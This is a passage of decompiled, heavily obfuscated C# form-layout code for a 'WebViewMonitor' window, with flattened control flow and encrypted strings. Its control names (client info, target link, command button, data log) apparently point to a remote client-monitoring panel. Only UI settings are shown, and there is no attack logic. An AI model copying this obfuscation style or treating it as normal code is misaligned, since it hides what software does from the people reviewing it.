            ((WebViewMonitor) this).savbtn.Size = new Size(100, 24);
            num1 = (int) num3 * 1507604093 ^ 839814020;
            continue;
          case 229:
            ((WebViewMonitor) this).idtext.Name = EXGuarder.\u0036C382A0B;
            ((WebViewMonitor) this).idtext.Padding = new Padding(5, 4, 5, 4);
            num1 = (int) num3 * -404580108 ^ 1231028088;
            continue;
          case 230:
            ((WebViewMonitor) this).openbtn.Font = new Font(EXGuarder.\u00340753611, 12f);
            num1 = (int) num3 * -667579286 ^ 173746319;
            continue;
          case 231:
            ((WebViewMonitor) this).datalogtext.Size = new Size(644, 349);
            num1 = (int) num3 * -11526947 ^ -366448661;
            continue;
          case 232:
            ((WebViewMonitor) this).Panel6.ResumeLayout(false);
            num1 = (int) num3 * 148385024 ^ -1392748128;
            continue;
          case 233:
            ((WebViewMonitor) this).savbtn.FillColor = Color.Black;
            num1 = (int) num3 * 1600387779 ^ -1620308241;
            continue;
          case 234:
            ((WebViewMonitor) this).selecthtmlbtn.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((WebViewMonitor) this).selecthtmlbtn.Font = new Font(EXGuarder.\u00340753611, 12f);
            ((WebViewMonitor) this).selecthtmlbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((WebViewMonitor) this).selecthtmlbtn.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 779616849 ^ 1727393413;
            continue;
          case 235:
            ((WebViewMonitor) this).comandcombo.Padding = new Padding(0, 0, 22, 0);
            num1 = (int) num3 * -2074286476 ^ 1756539029;
            continue;
          case 236:
            ((WebViewMonitor) this).datalogtext.Style = UIStyle.Custom;
            ((WebViewMonitor) this).datalogtext.StyleCustomMode = true;
            num1 = (int) num3 * -1638756919 ^ 1790718277;
            continue;
          case 237:
            ((WebViewMonitor) this).clrbtn.Size = new Size(100, 24);
            num1 = (int) num3 * 264817987 ^ 834890797;
            continue;
          case 238:
            ((WebViewMonitor) this).datapanel.Size = new Size(644, 375);
            ((WebViewMonitor) this).datapanel.Style = UIStyle.Custom;
            num1 = (int) num3 * 1636588470 ^ 1357982793;
            continue;
          case 239:
            ((WebViewMonitor) this).linktext.Font = new Font(EXGuarder.\u00340753611, 12f);
            ((WebViewMonitor) this).linktext.ForeColor = Color.White;
            num1 = (int) num3 * 1596225917 ^ -70371639;
            continue;
          case 240:
            ((WebViewMonitor) this).timeloader.Interval = 30;
            num1 = (int) num3 * -442265194 ^ 394537300;
            continue;
          case 241:
            ((WebViewMonitor) this).Panel2.ResumeLayout(false);
            num1 = (int) num3 * -878666704 ^ 371503745;
            continue;
          case 242:
            ((WebViewMonitor) this).datapanel.Controls.Add((Control) ((WebViewMonitor) this).datalogtext);
            num1 = (int) num3 * 1521813278 ^ -1052631952;
            continue;
          case 243:
            ((WebViewMonitor) this).linktext.Radius = 10;
            ((WebViewMonitor) this).linktext.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1121761593 ^ -34987946;
            continue;
          case 244:
            ((WebViewMonitor) this).resulttext.TextAlign = ContentAlignment.TopCenter;
            ((WebViewMonitor) this).Panel4.BackColor = Color.Black;
            num1 = (int) num3 * 1453262602 ^ 501121652;
            continue;
          case 245:
            ((WebViewMonitor) this).datapanel.TabIndex = 1;
            ((WebViewMonitor) this).datapanel.Text = EXGuarder.\u0036E1B5648;
            ((WebViewMonitor) this).datapanel.TitleColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((WebViewMonitor) this).datalogtext.AutoWordSelection = true;
            num1 = (int) num3 * 1676461278 ^ -606738063;
            continue;
          case 246:
            ((WebViewMonitor) this).Label3.Font = new Font(EXGuarder.\u00340753611, 10f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((WebViewMonitor) this).Label3.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((WebViewMonitor) this).Label3.Location = new Point(594, 8);
            ((WebViewMonitor) this).Label3.Name = EXGuarder.\u00341542704;
            ((WebViewMonitor) this).Label3.Size = new Size(90, 23);
            num1 = (int) num3 * 75180404 ^ 503762971;
            continue;
          case 247:
            ((WebViewMonitor) this).clinameinfo.TabIndex = 12;
            num1 = (int) num3 * 541890760 ^ 1492131094;
            continue;
          case 248:
            ((WebViewMonitor) this).vsbar.Name = EXGuarder.\u00354643B75;
            num1 = (int) num3 * -1633327433 ^ -1559923346;
            continue;
          case 249:
            ((WebViewMonitor) this).clrbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            ((WebViewMonitor) this).clrbtn.RectHoverColor = Color.White;
            ((WebViewMonitor) this).clrbtn.RectPressColor = Color.White;
            ((WebViewMonitor) this).clrbtn.RectSelectedColor = Color.White;
            num1 = (int) num3 * 1622850822 ^ 693846556;
            continue;
          case 250:
            ((WebViewMonitor) this).comandcombo.Style = UIStyle.Custom;
            num1 = (int) num3 * -671149383 ^ 1835425370;
            continue;
          case 251:
            ((WebViewMonitor) this).TabPage3.SuspendLayout();
            num1 = (int) num3 * 696358489 ^ -1774772952;
            continue;
          case 252:
            ((WebViewMonitor) this).idtext.Location = new Point(386, 7);
            ((WebViewMonitor) this).idtext.Margin = new Padding(4);
            ((WebViewMonitor) this).idtext.Maximum = (double) int.MaxValue;
            ((WebViewMonitor) this).idtext.Minimum = (double) int.MinValue;
            num1 = (int) num3 * 689589840 ^ 1355917166;
            continue;
          case 253:
            ((WebViewMonitor) this).comandcombo.ForeColor = Color.White;
            num1 = (int) num3 * -357997418 ^ 956729883;
            continue;
          case 254:
            ((WebViewMonitor) this).Panel9 = new Panel();
            num1 = (int) num3 * 1398018278 ^ 1421630985;
            continue;
          case (uint) byte.MaxValue:
            ((WebViewMonitor) this).clinameinfo.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -456226782 ^ -636915551;
            continue;
          case 256:
            ((WebViewMonitor) this).clinameinfo.BackColor = Color.Transparent;
            num1 = (int) num3 * -1263017650 ^ -283382586;
            continue;
          case 257:
            ((WebViewMonitor) this).Mytitle.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -763343856 ^ 2060223633;
            continue;
          case 258:
            ((WebViewMonitor) this).idtext.Cursor = Cursors.IBeam;
            ((WebViewMonitor) this).idtext.FillColor = Color.Black;
            num1 = (int) num3 * -1787168221 ^ 1287710039;
            continue;
          case 259:
            ((WebViewMonitor) this).namescombo.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 815488532 ^ 1959817080;
            continue;
          case 260:
            ((WebViewMonitor) this).Panel4.Controls.Add((Control) ((WebViewMonitor) this).selecthtmlbtn);
            num1 = (int) num3 * -1171838844 ^ -1690026417;
            continue;
          case 261:
            ((WebViewMonitor) this).savbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num3 * 1688069825 ^ -20471707;
            continue;
          case 262:
            ((WebViewMonitor) this).linkspanel.Text = EXGuarder.\u003502F060B;
            ((WebViewMonitor) this).linkspanel.TitleColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((WebViewMonitor) this).Panel8.BackColor = Color.Black;
            num1 = (int) num3 * 791007885 ^ 28145432;
            continue;
          case 263:
            ((WebViewMonitor) this).Panel2.BackColor = Color.Black;
            ((WebViewMonitor) this).Panel2.Controls.Add((Control) ((WebViewMonitor) this).statustext);
            ((WebViewMonitor) this).Panel2.Dock = DockStyle.Bottom;
            ((WebViewMonitor) this).Panel2.Location = new Point(0, 533);
            ((WebViewMonitor) this).Panel2.Name = EXGuarder.\u00341484026;
            ((WebViewMonitor) this).Panel2.Size = new Size(928, 16);
            num1 = (int) num3 * -958898205 ^ -1472748398;
            continue;
          case 264:
            ((WebViewMonitor) this).comandcombo.MinimumSize = new Size(47, 0);
            num1 = (int) num3 * -1723174011 ^ -452852318;
            continue;
          case 265:
            ((WebViewMonitor) this).nametext.TabIndex = 45;
            ((WebViewMonitor) this).nametext.TextAlignment = ContentAlignment.TopCenter;
            ((WebViewMonitor) this).nametext.Watermark = EXGuarder.\u0036303670E;
            num1 = (int) num3 * -1298207020 ^ -1655168120;
            continue;
          case 266:
            ((WebViewMonitor) this).savbtn.Radius = 25;
            num1 = (int) num3 * -1677339624 ^ 347173788;
            continue;
          case 267:
            ((WebViewMonitor) this).refbtn.Location = new Point(10, 7);
            ((WebViewMonitor) this).refbtn.Name = EXGuarder.\u0036E2F653A;
            ((WebViewMonitor) this).refbtn.Radius = 25;
            ((WebViewMonitor) this).refbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1855467069 ^ 1494515985;
            continue;
          case 268:
            ((WebViewMonitor) this).SaveCheck.Name = EXGuarder.\u00359200070;
            ((WebViewMonitor) this).SaveCheck.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num3 * 173374342 ^ -1081024260;
            continue;
          case 269:
            ((WebViewMonitor) this).openbtn.FillColor = Color.Black;
            num1 = (int) num3 * 1604186565 ^ 1403988013;
            continue;
          case 270:
            ((WebViewMonitor) this).TabPage1.Controls.Add((Control) ((WebViewMonitor) this).Panel1);
            num1 = (int) num3 * 792000106 ^ 429962505;
            continue;
          case 271:
            ((WebViewMonitor) this).vsbar.Style = UIStyle.Custom;
            ((WebViewMonitor) this).vsbar.TabIndex = 1;
            ((WebViewMonitor) this).vsbar.Text = EXGuarder.\u0031E610E4E;
            num1 = (int) num3 * -1838409736 ^ -1381251561;
            continue;
          case 272:
            ((WebViewMonitor) this).TabPage1.Controls.Add((Control) ((WebViewMonitor) this).vsbar);
            num1 = (int) num3 * -1710717487 ^ 281793963;
            continue;
          case 273:
            ((WebViewMonitor) this).clrbtn.Name = EXGuarder.\u0030448362C;
            num1 = (int) num3 * -1158606113 ^ 818442307;
            continue;
          case 274:
            ((WebViewMonitor) this).linktext.Location = new Point(258, 7);
            num1 = (int) num3 * -357647866 ^ 28512821;
            continue;
          case 275:
            ((WebViewMonitor) this).TabPage2.Text = EXGuarder.\u003650F0143;
            num1 = (int) num3 * -637201160 ^ 392662831;
            continue;
          case 276:
            ((WebViewMonitor) this).tabcontrols.Multiline = true;
            ((WebViewMonitor) this).tabcontrols.Name = EXGuarder.\u00369110936;
            ((WebViewMonitor) this).tabcontrols.SelectedIndex = 0;
            num1 = (int) num3 * -1013335117 ^ -1168318237;
            continue;
          case 277:
            ((WebViewMonitor) this).datapanel.Location = new Point(284, 38);
            ((WebViewMonitor) this).datapanel.Margin = new Padding(3, 4, 3, 4);
            ((WebViewMonitor) this).datapanel.Name = EXGuarder.\u00344335C55;
            ((WebViewMonitor) this).datapanel.Padding = new Padding(0, 26, 0, 0);
            num1 = (int) num3 * -117790836 ^ 437075719;
            continue;
          case 278:
            ((WebViewMonitor) this).datalogtext.TabIndex = 0;
            num1 = (int) num3 * 1558449362 ^ -2052940105;
            continue;
          case 279:
            this.Controls.Add((Control) ((WebViewMonitor) this).Panel3);
            this.Controls.Add((Control) ((WebViewMonitor) this).Panel5);
            num1 = (int) num3 * 14439180 ^ -139594006;
            continue;
          case 280:
            ((WebViewMonitor) this).openbtn.RectHoverColor = Color.White;
            num1 = (int) num3 * -310077106 ^ -873613314;
            continue;
          case 281:
            ((WebViewMonitor) this).openbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1461990618 ^ 1494724840;
            continue;
          case 282:
            ((WebViewMonitor) this).cpybtn.BackColor = Color.Black;
            num1 = (int) num3 * -1557238406 ^ -47728447;
            continue;
          case 283:
            ((WebViewMonitor) this).Panel8.Size = new Size(928, 38);
            ((WebViewMonitor) this).Panel8.TabIndex = 0;
            num1 = (int) num3 * -1994202156 ^ -1205989322;
            continue;
          case 284:
            ((WebViewMonitor) this).idtext.StyleCustomMode = true;
            num1 = (int) num3 * 1444559998 ^ 987506947;
            continue;
          case 285:
            ((WebViewMonitor) this).openbtn.Dock = DockStyle.Right;
            num1 = (int) num3 * 360323541 ^ -1221398237;
            continue;
          case 286:
            ((WebViewMonitor) this).TabPage2.Size = new Size(928, 453);
            ((WebViewMonitor) this).TabPage2.TabIndex = 1;
            num1 = (int) num3 * 1013066474 ^ 898906332;
            continue;
          case 287:
            ((WebViewMonitor) this).Panel5.ResumeLayout(false);
            ((ISupportInitialize) ((WebViewMonitor) this).ClientPic).EndInit();
            num1 = (int) num3 * 2071009011 ^ 146170947;
            continue;
          case 288:
            ((WebViewMonitor) this).Label2.Size = new Size(183, 33);
            ((WebViewMonitor) this).Label2.TabIndex = 20;
            num1 = (int) num3 * -1358251304 ^ 1351210956;
            continue;
          case 289:
            ((WebViewMonitor) this).TargetLink.Padding = new Padding(5, 4, 5, 4);
            num1 = (int) num3 * 671586902 ^ -1494289928;
            continue;
          case 290:
            ((WebViewMonitor) this).cpybtn.FillHoverColor = Color.FromArgb(20, 20, 20);
            ((WebViewMonitor) this).cpybtn.FillPressColor = Color.Black;
            num1 = (int) num3 * -1538268842 ^ -770040630;
            continue;
          case 291:
            ((WebViewMonitor) this).nametext.Size = new Size(121, 27);
            num1 = (int) num3 * 1575727142 ^ 1669838115;
            continue;
          case 292:
            ((WebViewMonitor) this).selecthtmlbtn.TabIndex = 18;
            ((WebViewMonitor) this).selecthtmlbtn.Text = EXGuarder.\u0033220695D;
            num1 = (int) num3 * 1248400784 ^ 1949171487;
            continue;
          case 293:
            ((WebViewMonitor) this).Panel5.SuspendLayout();
            num1 = (int) num3 * -1377683032 ^ -511471967;
            continue;
          case 294:
            this.ResumeLayout(false);
            num1 = (int) num3 * -1403607685 ^ -594165411;
            continue;
          case 295:
            ((WebViewMonitor) this).Panel5.Location = new Point(0, 0);
            num1 = (int) num3 * 1783072023 ^ 2016877372;
            continue;
          case 296:
            this.AutoScaleDimensions = new SizeF(6f, 12f);
            this.AutoScaleMode = AutoScaleMode.Font;
            num1 = (int) num3 * -573539230 ^ -352573064;
            continue;
          case 297:
            ((WebViewMonitor) this).vewimage = new PictureBox();
            num1 = (int) num3 * 2008937284 ^ 1188039854;
            continue;
          case 298:
            ((WebViewMonitor) this).comandcombo.TextAlignment = ContentAlignment.MiddleLeft;
            ((WebViewMonitor) this).namescombo.BackColor = Color.Black;
            num1 = (int) num3 * 1557697728 ^ -547046135;
            continue;
          case 299:
            ((WebViewMonitor) this).DrakeUIComboBox1.TabIndex = 21;
            ((WebViewMonitor) this).DrakeUIComboBox1.Text = EXGuarder.\u0033B3D1B1D;
            num1 = (int) num3 * -336288639 ^ 720036842;
            continue;
          case 300:
            ((WebViewMonitor) this).TabPage1.Text = EXGuarder.\u0034F273747;
            ((WebViewMonitor) this).vewimage.BackColor = Color.FromArgb(10, 10, 10);
            num1 = (int) num3 * 413299170 ^ 409127359;
            continue;
          case 301:
            ((WebViewMonitor) this).tabcontrols.Controls.Add((Control) ((WebViewMonitor) this).TabPage2);
            ((WebViewMonitor) this).tabcontrols.Controls.Add((Control) ((WebViewMonitor) this).TabPage3);
            ((WebViewMonitor) this).tabcontrols.Dock = DockStyle.Fill;
            num1 = (int) num3 * 949091999 ^ 369561999;
            continue;
          case 302:
            ((WebViewMonitor) this).tabcontrols.ItemSize = new Size(380, 40);
            ((WebViewMonitor) this).tabcontrols.Location = new Point(0, 0);
            num1 = (int) num3 * 481605781 ^ 1857763404;
            continue;
          case 303:
            ((WebViewMonitor) this).DrakeUIComboBox1.FillColor = Color.Black;
            ((WebViewMonitor) this).DrakeUIComboBox1.Font = new Font(EXGuarder.\u00340753611, 12f);
            num1 = (int) num3 * -1031390204 ^ -1089869297;
            continue;
          case 304:
            ((WebViewMonitor) this).nametext.Name = EXGuarder.\u003204A5276;
            num1 = (int) num3 * -1896554855 ^ 1360994515;
            continue;
          case 305:
            ((WebViewMonitor) this).Panel6.TabIndex = 23;
            ((WebViewMonitor) this).TargetLink.Cursor = Cursors.IBeam;
            ((WebViewMonitor) this).TargetLink.Dock = DockStyle.Fill;
            ((WebViewMonitor) this).TargetLink.FillColor = Color.Black;
            ((WebViewMonitor) this).TargetLink.Font = new Font(EXGuarder.\u00340753611, 12f);
            num1 = (int) num3 * -1018893754 ^ 870231564;
            continue;
          case 306:
            ((WebViewMonitor) this).TabPage3.Controls.Add((Control) ((WebViewMonitor) this).Panel9);
            ((WebViewMonitor) this).TabPage3.Location = new Point(0, 80);
            num1 = (int) num3 * -1054078951 ^ -230537958;
            continue;
          case 307:
            ((WebViewMonitor) this).Panel6.Name = EXGuarder.\u00316456566;
            num1 = (int) num3 * 1966551442 ^ 1802441602;
            continue;
          case 308:
            ((WebViewMonitor) this).commndbtn.Name = EXGuarder.\u003375C7858;
            num1 = (int) num3 * 620393171 ^ -589461170;
            continue;
          case 309:
            ((WebViewMonitor) this).datapanel.Font = new Font(EXGuarder.\u00340753611, 12f);
            num1 = (int) num3 * 1721177980 ^ 1979932396;
            continue;
          case 310:
            ((WebViewMonitor) this).nametext.Minimum = (double) int.MinValue;
            num1 = (int) num3 * -1134009089 ^ 856283230;
            continue;
          case 311:
            ((WebViewMonitor) this).linktext.Size = new Size(121, 27);
            num1 = (int) num3 * 2136020944 ^ -1333559030;
            continue;
          case 312:
            ((WebViewMonitor) this).comandcombo.Font = new Font(EXGuarder.\u00340753611, 12f);
            num1 = (int) num3 * -652252620 ^ 460147769;
            continue;
          case 313:
            ((WebViewMonitor) this).namescombo.TabIndex = 47;
            num1 = (int) num3 * -1963550756 ^ -925638538;
            continue;
          case 314:
            ((WebViewMonitor) this).TabPage3.Margin = new Padding(2);
            num1 = (int) num3 * 477289347 ^ -39916055;
            continue;
          case 315:
            ((WebViewMonitor) this).idtext = new DrakeUITextBox();
            num1 = (int) num3 * 392215090 ^ 713259927;
            continue;
          case 316:
            ((WebViewMonitor) this).openbtn.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1528885843 ^ -1487041747;
            continue;
          case 317:
            ((WebViewMonitor) this).Label3 = new Label();
            ((WebViewMonitor) this).comandcombo = new DrakeUIComboBox();
            ((WebViewMonitor) this).namescombo = new DrakeUIComboBox();
            num1 = (int) num3 * 834080080 ^ -194910117;
            continue;
          case 318:
            ((WebViewMonitor) this).tabcontrols.Controls.Add((Control) ((WebViewMonitor) this).TabPage1);
            num1 = (int) num3 * 1963749281 ^ 854734122;
            continue;
          case 319:
            ((WebViewMonitor) this).comandcombo.Radius = 15;
            num1 = (int) num3 * 421805656 ^ -1301369180;
            continue;
          case 320:
            ((WebViewMonitor) this).datapanel.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1802627076 ^ 1264882855;
            continue;
          case 321:
            ((WebViewMonitor) this).clrbtn.Location = new Point(818, 7);
            num1 = (int) num3 * -437243926 ^ -647465928;
            continue;
          case 322:
            ((WebViewMonitor) this).nametext.Padding = new Padding(5, 4, 5, 4);
            num1 = (int) num3 * 570110154 ^ -313878248;
            continue;
          case 323:
            ((WebViewMonitor) this).linktext.Minimum = (double) int.MinValue;
            num1 = (int) num3 * 1431391735 ^ 1574193376;
            continue;
          case 324:
            ((WebViewMonitor) this).statustext.TabIndex = 21;
            num1 = (int) num3 * 1556604322 ^ 1804146504;
            continue;
          case 325:
            ((WebViewMonitor) this).TabPage3.TabIndex = 0;
            num1 = (int) num3 * 1858682064 ^ 57192968;
            continue;
          case 326:
            ((WebViewMonitor) this).Panel8.Location = new Point(0, 0);
            num1 = (int) num3 * 1844920327 ^ -842014275;
            continue;
          case 327:
            ((WebViewMonitor) this).Panel5 = new Panel();
            ((WebViewMonitor) this).clinameinfo = new Label();
            num1 = (int) num3 * 1807334727 ^ -1184704935;
            continue;
          case 328:
            ((WebViewMonitor) this).selecthtmlbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            ((WebViewMonitor) this).selecthtmlbtn.RectHoverColor = Color.White;
            num1 = (int) num3 * 870306959 ^ 1670228437;
            continue;
          case 329:
            ((WebViewMonitor) this).TargetLink.Margin = new Padding(4);
            ((WebViewMonitor) this).TargetLink.Maximum = (double) int.MaxValue;
            ((WebViewMonitor) this).TargetLink.Minimum = (double) int.MinValue;
            ((WebViewMonitor) this).TargetLink.Name = EXGuarder.\u003095F7941;
            num1 = (int) num3 * -968587573 ^ -371781804;
            continue;
          case 330:
            ((WebViewMonitor) this).TargetLink.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 190887808 ^ 1596908852;
            continue;
          case 331:
            ((WebViewMonitor) this).selecthtmlbtn.FillPressColor = Color.Black;
            num1 = (int) num3 * 1140964104 ^ 1580084298;
            continue;
          case 332:
            ((WebViewMonitor) this).DrakeUIComboBox1.TextAlignment = ContentAlignment.MiddleLeft;
            ((WebViewMonitor) this).openbtn.Cursor = Cursors.Hand;
            num1 = (int) num3 * -652910998 ^ 893076933;
            continue;
          case 333:
            ((WebViewMonitor) this).TabPage2.Location = new Point(0, 80);
            num1 = (int) num3 * 1402203193 ^ -1071876384;
            continue;
          case 334:
            ((WebViewMonitor) this).Panel7 = new Panel();
            ((WebViewMonitor) this).SaveCheck = new DrakeUICheckBox();
            num1 = (int) num3 * -1856515513 ^ 1943319869;
            continue;
          case 335:
            ((WebViewMonitor) this).TabPage2.Controls.Add((Control) ((WebViewMonitor) this).Panel4);
            num1 = (int) num3 * -1646320982 ^ 1052824938;
            continue;
          case 336:
            ((WebViewMonitor) this).nametext.Margin = new Padding(4);
            ((WebViewMonitor) this).nametext.Maximum = (double) int.MaxValue;
            num1 = (int) num3 * 1180526706 ^ -98366258;
            continue;
          case 337:
            ((WebViewMonitor) this).savbtn.BackColor = Color.Black;
            num1 = (int) num3 * 1431565103 ^ -798225286;
            continue;
          case 338:
            ((WebViewMonitor) this).statustext.Size = new Size(928, 16);
            num1 = (int) num3 * -754038871 ^ 1455300429;
            continue;
          case 339:
            ((WebViewMonitor) this).refbtn.FillColor = Color.Black;
            ((WebViewMonitor) this).refbtn.Font = new Font(EXGuarder.\u00340753611, 12f);
            num1 = (int) num3 * 399216033 ^ -806936706;
            continue;
          case 340:
            ((WebViewMonitor) this).namescombo.Size = new Size(112, 27);
            ((WebViewMonitor) this).namescombo.Style = UIStyle.Custom;
            num1 = (int) num3 * 2096021483 ^ 1581528279;
            continue;
          case 341:
            this.SuspendLayout();
            ((WebViewMonitor) this).Panel1.BackColor = Color.Black;
            ((WebViewMonitor) this).Panel1.Controls.Add((Control) ((WebViewMonitor) this).Panel7);
            num1 = (int) num3 * -803229078 ^ 261839883;
            continue;
          case 342:
            this.Text = EXGuarder.\u003460C0F64;
            num1 = (int) num3 * 1237406412 ^ -212684576;
            continue;
          case 343:
            ((WebViewMonitor) this).tabcontrols.TabSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1505366118 ^ 1812424281;
            continue;
          case 344:
            ((WebViewMonitor) this).statustext = new Label();
            ((WebViewMonitor) this).Panel3 = new Panel();
            num1 = (int) num3 * -1613036877 ^ 809277645;
            continue;
          case 345:
            ((WebViewMonitor) this).Panel5.Size = new Size(928, 29);
            ((WebViewMonitor) this).Panel5.TabIndex = 6;
            num1 = (int) num3 * 527883081 ^ -1988177611;
            continue;
          case 346:
            ((WebViewMonitor) this).Panel5.Controls.Add((Control) ((WebViewMonitor) this).clinameinfo);
            num1 = (int) num3 * -842946425 ^ -69366617;
            continue;
          case 347:
            ((WebViewMonitor) this).Panel3.ResumeLayout(false);
            ((WebViewMonitor) this).tabcontrols.ResumeLayout(false);
            ((WebViewMonitor) this).TabPage1.ResumeLayout(false);
            num1 = (int) num3 * 559423725 ^ -351672411;
            continue;
          case 348:
            ((WebViewMonitor) this).openbtn = new DrakeUIButtonIcon();
            num1 = (int) num3 * -791887300 ^ 83036942;
            continue;
          case 349:
            ((WebViewMonitor) this).Panel6.Margin = new Padding(2);
            num1 = (int) num3 * -1792278056 ^ 161269478;
            continue;
          case 350:
            ((WebViewMonitor) this).Label2.Text = EXGuarder.\u0035C726F2B;
            ((WebViewMonitor) this).selecthtmlbtn.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            ((WebViewMonitor) this).selecthtmlbtn.Cursor = Cursors.Hand;
            num1 = (int) num3 * -1609058309 ^ 435254312;
            continue;
          case 351:
            ((WebViewMonitor) this).tabcontrols.TabBackColor = Color.FromArgb(30, 30, 30);
            ((WebViewMonitor) this).tabcontrols.TabIndex = 2;
            num1 = (int) num3 * 64407317 ^ 1020000486;
            continue;
          case 352:
            ((WebViewMonitor) this).Panel6.Size = new Size(928, 28);
            num1 = (int) num3 * 492177339 ^ -1996071790;
            continue;
          case 353:
            ((WebViewMonitor) this).DrakeUIComboBox1.MinimumSize = new Size(63, 0);
            ((WebViewMonitor) this).DrakeUIComboBox1.Name = EXGuarder.\u00365603637;
            num1 = (int) num3 * -1371086623 ^ 1610879925;
            continue;
          case 354:
            ((WebViewMonitor) this).vsbar.Size = new Size(19, 401);
            num1 = (int) num3 * -1880733951 ^ 869161594;
            continue;
          case 355:
            ((WebViewMonitor) this).selecthtmlbtn.Name = EXGuarder.\u0030E672D02;
            num1 = (int) num3 * -291551805 ^ -1680322791;
            continue;
          case 356:
            ((WebViewMonitor) this).vsbar = new DrakeUIScrollBar();
            ((WebViewMonitor) this).TabPage2 = new TabPage();
            num1 = (int) num3 * -666242156 ^ 911539985;
            continue;
          case 357:
            ((WebViewMonitor) this).DrakeUIComboBox1.Radius = 15;
            ((WebViewMonitor) this).DrakeUIComboBox1.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -739653408 ^ -122142464;
            continue;
          case 358:
            ((WebViewMonitor) this).SaveCheck.StyleCustomMode = true;
            num1 = (int) num3 * 739558606 ^ -69201142;
            continue;
          case 359:
            ((WebViewMonitor) this).DrakeUIComboBox1.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * -301909502 ^ 86367650;
            continue;
          case 360:
            ((WebViewMonitor) this).datalogtext.Font = new Font(EXGuarder.\u00340753611, 12f);
            num1 = (int) num3 * 1082594420 ^ -1532089300;
            continue;
          case 361:
            ((WebViewMonitor) this).clinameinfo.Font = new Font(EXGuarder.\u00340753611, 9f);
            num1 = (int) num3 * 1334963305 ^ -1453968985;
            continue;
          case 362:
            ((WebViewMonitor) this).cpybtn.RectPressColor = Color.White;
            ((WebViewMonitor) this).cpybtn.RectSelectedColor = Color.White;
            num1 = (int) num3 * -1131218882 ^ 2129842004;
            continue;
          case 363:
            ((WebViewMonitor) this).ClientPic.Margin = new Padding(2, 3, 2, 3);
            ((WebViewMonitor) this).ClientPic.Name = EXGuarder.\u00374295468;
            num1 = (int) num3 * 406942482 ^ -1173568100;
            continue;
          case 364:
            ((WebViewMonitor) this).idtext.Font = new Font(EXGuarder.\u00340753611, 12f);
            num1 = (int) num3 * -118959834 ^ 1222899214;
            continue;
          case 365:
            ((WebViewMonitor) this).Panel8.ResumeLayout(false);
            ((WebViewMonitor) this).Panel9.ResumeLayout(false);
            num1 = (int) num3 * 125293351 ^ 1902530399;
            continue;
          case 366:
            ((WebViewMonitor) this).commndbtn.Size = new Size(146, 24);
            num1 = (int) num3 * 416184569 ^ -159825408;
            continue;
          case 367:
            ((WebViewMonitor) this).Panel8.SuspendLayout();
            num1 = (int) num3 * -1657446932 ^ 421344577;
            continue;
          case 368:
            ((WebViewMonitor) this).savbtn.RectPressColor = Color.White;
            ((WebViewMonitor) this).savbtn.RectSelectedColor = Color.White;
            num1 = (int) num3 * -1903842044 ^ 638692157;
            continue;
          case 369:
            ((WebViewMonitor) this).Panel9.Margin = new Padding(2);
            num1 = (int) num3 * -1764096269 ^ -1580421782;
            continue;
          case 370:
            ((WebViewMonitor) this).TabPage2.Name = EXGuarder.\u00311221E36;
            num1 = (int) num3 * 239030319 ^ -1840561412;
            continue;
          case 371:
            ((WebViewMonitor) this).namescombo.DropDownStyle = UIDropDownStyle.DropDownList;
            ((WebViewMonitor) this).namescombo.FillColor = Color.Black;
            num1 = (int) num3 * -610656793 ^ -1426570819;
            continue;
          case 372:
            ((WebViewMonitor) this).Panel1.Location = new Point(0, 0);
            ((WebViewMonitor) this).Panel1.Name = EXGuarder.\u0036A5B444C;
            ((WebViewMonitor) this).Panel1.Size = new Size(928, 52);
            ((WebViewMonitor) this).Panel1.TabIndex = 1;
            num1 = (int) num3 * -1755256929 ^ -1401059648;
            continue;
          case 373:
            ((WebViewMonitor) this).Panel7.Location = new Point(0, 0);
            num1 = (int) num3 * -353399355 ^ 610399926;
            continue;
          case 374:
            ((WebViewMonitor) this).comandcombo.Margin = new Padding(3, 4, 3, 4);
            num1 = (int) num3 * -1165205046 ^ -176888054;
            continue;
          case 375:
            ((WebViewMonitor) this).ClientPic.TabIndex = 11;
            num1 = (int) num3 * 723031078 ^ 1330570531;
            continue;
          case 376:
            ((WebViewMonitor) this).datalogtext.ForeColor = Color.White;
            num1 = (int) num3 * -1845194206 ^ -1453410396;
            continue;
          case 377:
            ((WebViewMonitor) this).Panel5.ForeColor = Color.Red;
            num1 = (int) num3 * -1007412642 ^ 120299286;
            continue;
          case 378:
            ((WebViewMonitor) this).Panel3.Controls.Add((Control) ((WebViewMonitor) this).tabcontrols);
            ((WebViewMonitor) this).Panel3.Controls.Add((Control) ((WebViewMonitor) this).Panel2);
            num1 = (int) num3 * 2141121834 ^ -32330142;
            continue;
          case 379:
            ((WebViewMonitor) this).linktext.Style = UIStyle.Custom;
            num1 = (int) num3 * 1990343741 ^ 1868712788;
            continue;
          case 380:
            ((WebViewMonitor) this).Panel8.Dock = DockStyle.Top;
            num1 = (int) num3 * 970214833 ^ 173380930;
            continue;
          case 381:
